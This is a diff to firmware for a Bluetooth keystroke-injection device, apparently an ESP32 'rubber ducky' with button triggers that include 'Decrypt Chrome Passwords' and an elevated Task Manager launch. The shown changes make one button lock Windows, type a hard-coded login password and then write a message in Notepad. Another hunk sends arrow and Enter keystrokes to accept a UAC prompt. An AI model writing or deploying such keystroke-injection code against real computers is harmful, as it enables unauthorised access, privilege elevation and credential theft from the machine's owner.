@@ -2,7 +2,7 @@
 
 #define BUTTON_1_PIN 16 // Button 1 (Trigger: Rickroll)
 #define BUTTON_2_PIN 17 // Button 2 (Trigger: System Info)
-#define BUTTON_3_PIN 18 // Button 3 (Trigger: Windows Lock)
+#define BUTTON_3_PIN 18 // Button 3 (Trigger: Windows Lock + Notepad Message)
 #define BUTTON_4_PIN 19 // Button 4 (Trigger: Decrypt Chrome Passwords)
 #define BUTTON_5_PIN 21 // Button 5 (Trigger: Task Manager Admin)
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)
@@ -80,13 +80,29 @@ void loop() {
       bleKeyboard.releaseAll(); delay(1000);
     }
 
-    // Button 3: Windows Lock (Win + L) (Pin 18)
+    // Button 3: Windows Lock + Notepad Message (Pin 18)
     if (lastState3 == HIGH && state3 == LOW) {
-      Serial.println("Button 3: Lock Screen (Win+L) (Pin 18)");
+      Serial.println("Button 3: Windows Lock + Notepad Message (Pin 18)");
+      // Lock screen (Win + L)
       bleKeyboard.press(KEY_LEFT_GUI); 
       bleKeyboard.press('l'); 
       delay(100); 
+      bleKeyboard.releaseAll(); delay(2000); // Wait for user to unlock
+      // Press Enter to confirm login
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000); // Wait for desktop
+      // Type "sachin" and Enter
+      sendString("sachin", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
+      // Open Run and launch Notepad
+      openRun(); delay(300); 
+      sendString("notepad"); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000); // Wait for Notepad to open
+      // Type message
+      sendString("This is bluetooth usb rubber ducky script is started on your computer system", 10); 
+      delay(500);
     }
 
     // Button 4: Decrypt Chrome Passwords (Pin 19)
@@ -119,7 +135,7 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_SHIFT); 
       bleKeyboard.press(KEY_RETURN); 
       delay(100); 
-      bleKeyboard.releaseAll(); delay(1000); // Wait for UAC prompt
+      bleKeyboard.releaseAll(); delay(1000);
       bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
       bleKeyboard.releaseAll(); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
